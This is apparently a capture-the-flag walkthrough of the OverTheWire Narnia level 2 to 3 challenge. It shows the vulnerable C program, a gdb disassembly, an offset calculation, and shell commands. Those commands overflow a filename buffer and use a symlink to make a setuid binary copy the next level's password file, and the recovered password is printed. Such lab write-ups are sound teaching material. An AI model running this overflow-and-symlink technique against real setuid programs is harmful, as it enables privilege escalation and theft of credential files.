#### Narnia Level 2 → Level 3

```sh
➜  ~ ssh narnia3@narnia.labs.overthewire.org -p 2226
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
narnia3@narnia.labs.overthewire.org's password:

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with
  easily guessable or short names will be periodically deleted!

  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!

narnia3@narnia:~$
```

```sh
narnia3@narnia:~$ cd /narnia/
narnia3@narnia:/narnia$ ll
total 116
drwxr-xr-x  2 root    root    4096 Nov  9 15:08 ./
drwxr-xr-x 25 root    root    4096 Nov 21 07:46 ../
-r-sr-x---  1 narnia1 narnia0 7568 Nov  9 15:08 narnia0*
-r--r-----  1 narnia0 narnia0 1186 Nov  9 15:08 narnia0.c
-r-sr-x---  1 narnia2 narnia1 7404 Nov  9 15:08 narnia1*
-r--r-----  1 narnia1 narnia1 1000 Nov  9 15:08 narnia1.c
-r-sr-x---  1 narnia3 narnia2 5164 Nov  9 15:08 narnia2*
-r--r-----  1 narnia2 narnia2  999 Nov  9 15:08 narnia2.c
-r-sr-x---  1 narnia4 narnia3 5836 Nov  9 15:08 narnia3*
-r--r-----  1 narnia3 narnia3 1841 Nov  9 15:08 narnia3.c
-r-sr-x---  1 narnia5 narnia4 5336 Nov  9 15:08 narnia4*
-r--r-----  1 narnia4 narnia4 1064 Nov  9 15:08 narnia4.c
-r-sr-x---  1 narnia6 narnia5 5700 Nov  9 15:08 narnia5*
-r--r-----  1 narnia5 narnia5 1261 Nov  9 15:08 narnia5.c
-r-sr-x---  1 narnia7 narnia6 6076 Nov  9 15:08 narnia6*
-r--r-----  1 narnia6 narnia6 1602 Nov  9 15:08 narnia6.c
-r-sr-x---  1 narnia8 narnia7 6676 Nov  9 15:08 narnia7*
-r--r-----  1 narnia7 narnia7 1974 Nov  9 15:08 narnia7.c
-r-sr-x---  1 narnia9 narnia8 5232 Nov  9 15:08 narnia8*
-r--r-----  1 narnia8 narnia8 1292 Nov  9 15:08 narnia8.c
narnia3@narnia:/narnia$
```

```sh
narnia3@narnia:/narnia$ cat narnia3.c
```

```c
/*
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){

        int  ifd,  ofd;
        char ofile[16] = "/dev/null";
        char ifile[32];
        char buf[32];

        if(argc != 2){
                printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
                exit(-1);
        }

        /* open files */
        strcpy(ifile, argv[1]);
        if((ofd = open(ofile,O_RDWR)) < 0 ){
                printf("error opening %s\n", ofile);
                exit(-1);
        }
        if((ifd = open(ifile, O_RDONLY)) < 0 ){
                printf("error opening %s\n", ifile);
                exit(-1);
        }

        /* copy from file1 to file2 */
        read(ifd, buf, sizeof(buf)-1);
        write(ofd,buf, sizeof(buf)-1);
        printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

        /* close 'em */
        close(ifd);
        close(ofd);

        exit(1);
}
```

```sh
narnia3@narnia:/narnia$ ./narnia3
usage, ./narnia3 file, will send contents of file 2 /dev/null
narnia3@narnia:/narnia$
```

```sh
narnia3@narnia:/narnia$ gdb ./narnia3 -q
Reading symbols from ./narnia3...(no debugging symbols found)...done.
(gdb) disassemble main
Dump of assembler code for function main:
   0x0804850d <+0>:	push   %ebp
   0x0804850e <+1>:	mov    %esp,%ebp
   0x08048510 <+3>:	and    $0xfffffff0,%esp
   0x08048513 <+6>:	sub    $0x70,%esp
   0x08048516 <+9>:	movl   $0x7665642f,0x58(%esp)
   0x0804851e <+17>:	movl   $0x6c756e2f,0x5c(%esp)
   0x08048526 <+25>:	movl   $0x6c,0x60(%esp)
   0x0804852e <+33>:	movl   $0x0,0x64(%esp)
   0x08048536 <+41>:	cmpl   $0x2,0x8(%ebp)
   0x0804853a <+45>:	je     0x804855d <main+80>
   0x0804853c <+47>:	mov    0xc(%ebp),%eax
   0x0804853f <+50>:	mov    (%eax),%eax
   0x08048541 <+52>:	mov    %eax,0x4(%esp)
   0x08048545 <+56>:	movl   $0x80486f0,(%esp)
   0x0804854c <+63>:	call   0x8048390 <printf@plt>
   0x08048551 <+68>:	movl   $0xffffffff,(%esp)
   0x08048558 <+75>:	call   0x80483b0 <exit@plt>
   0x0804855d <+80>:	mov    0xc(%ebp),%eax
   0x08048560 <+83>:	add    $0x4,%eax
   0x08048563 <+86>:	mov    (%eax),%eax
   0x08048565 <+88>:	mov    %eax,0x4(%esp)
   0x08048569 <+92>:	lea    0x38(%esp),%eax
   0x0804856d <+96>:	mov    %eax,(%esp)
   0x08048570 <+99>:	call   0x80483a0 <strcpy@plt>
   0x08048575 <+104>:	movl   $0x2,0x4(%esp)
   0x0804857d <+112>:	lea    0x58(%esp),%eax
   0x08048581 <+116>:	mov    %eax,(%esp)
   0x08048584 <+119>:	call   0x80483c0 <open@plt>
   0x08048589 <+124>:	mov    %eax,0x6c(%esp)
   0x0804858d <+128>:	cmpl   $0x0,0x6c(%esp)
   0x08048592 <+133>:	jns    0x80485b4 <main+167>
   0x08048594 <+135>:	lea    0x58(%esp),%eax
   0x08048598 <+139>:	mov    %eax,0x4(%esp)
   0x0804859c <+143>:	movl   $0x8048728,(%esp)
   0x080485a3 <+150>:	call   0x8048390 <printf@plt>
   0x080485a8 <+155>:	movl   $0xffffffff,(%esp)
   0x080485af <+162>:	call   0x80483b0 <exit@plt>
   0x080485b4 <+167>:	movl   $0x0,0x4(%esp)
   0x080485bc <+175>:	lea    0x38(%esp),%eax
   0x080485c0 <+179>:	mov    %eax,(%esp)
   0x080485c3 <+182>:	call   0x80483c0 <open@plt>
   0x080485c8 <+187>:	mov    %eax,0x68(%esp)
   0x080485cc <+191>:	cmpl   $0x0,0x68(%esp)
   0x080485d1 <+196>:	jns    0x80485f3 <main+230>
   0x080485d3 <+198>:	lea    0x38(%esp),%eax
   0x080485d7 <+202>:	mov    %eax,0x4(%esp)
   0x080485db <+206>:	movl   $0x8048728,(%esp)
   0x080485e2 <+213>:	call   0x8048390 <printf@plt>
   0x080485e7 <+218>:	movl   $0xffffffff,(%esp)
   0x080485ee <+225>:	call   0x80483b0 <exit@plt>
---Type <return> to continue, or q <return> to quit---
```

```sh
➜  ~ python
Python 2.7.10 (default, Jul 15 2017, 17:16:57)
[GCC 4.2.1 Compatible Apple LLVM 9.0.0 (clang-900.0.31)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x58
88
>>> 0x38
56
>>> 88-56
32
>>>
```

```sh
>>> print ("/tmp/") + ("a" * (32-5)) + ("/tmp/kan1shka9")
/tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/kan1shka9
>>>
```

```sh
narnia3@narnia:/narnia$ mkdir -p /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/
narnia3@narnia:/narnia$ ln -s /etc/narnia_pass/narnia4 /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/kan1shka9
narnia3@narnia:/narnia$ touch /tmp/kan1shka9
narnia3@narnia:/narnia$ chmod 666 /tmp/kan1shka9
narnia3@narnia:/narnia$ ./narnia3 /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/kan1shka9
copied contents of /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/kan1shka9 to a safer place... (/tmp/kan1shka9)
narnia3@narnia:/narnia$ cat /tmp/kan1shka9
thaenohtai
�/�=������p�narnia3@narnia:/narnia$
```